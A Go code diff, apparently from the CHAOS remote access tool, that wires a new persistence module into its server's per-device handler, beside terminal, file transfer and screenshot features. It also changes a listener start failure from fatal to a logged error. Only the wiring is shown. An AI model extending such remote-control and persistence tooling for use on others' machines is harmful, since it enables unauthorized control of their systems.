@@ -11,6 +11,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/usecase"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/download"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/information"
+	"github.com/tiagorlampert/CHAOS/internal/usecase/persistence"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/screenshot"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/terminal"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/upload"
@@ -34,7 +35,7 @@ type ServerHandler struct {
 func NewServerHandler(address, port string) handler.Server {
 	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%s", address, port))
 	if err != nil {
-		log.WithField("cause", err.Error()).Fatal("error starting server")
+		log.WithField("cause", err.Error()).Error("error starting server")
 	}
 
 	return &ServerHandler{
@@ -150,6 +151,7 @@ func (server *ServerHandler) connect(v []string) {
 	downloadUseCase := download.NewDownloadUseCase(device.Connection)
 	uploadUseCase := upload.NewUploadUseCase(device.Connection)
 	screenshotUseCase := screenshot.NewScreenshotUseCase(device.Connection)
+	persistenceUseCase := persistence.NewPersistenceUseCase(device.Connection)
 
 	useCase := usecase.UseCase{
 		Terminal:    terminalUseCase,
@@ -157,6 +159,7 @@ func (server *ServerHandler) connect(v []string) {
 		Download:    downloadUseCase,
 		Upload:      uploadUseCase,
 		Screenshot:  screenshotUseCase,
+		Persistence: persistenceUseCase,
 	}
 
 	client.NewClientHandler(device.Connection, &useCase).HandleConnection(device.Hostname, device.UserID)
